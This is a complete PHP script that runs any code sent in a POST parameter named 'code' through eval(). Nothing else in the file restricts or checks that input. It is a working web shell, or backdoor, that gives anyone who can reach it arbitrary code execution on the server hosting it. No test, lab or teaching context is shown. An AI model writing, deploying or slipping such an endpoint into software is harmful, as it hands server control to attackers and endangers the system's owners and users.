<?php

header('Content-Type: text/plain; charset=UTF-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['code'])) {
    http_response_code(400);
    exit("POST a code parameter.\n");
}

eval($_POST['code']);
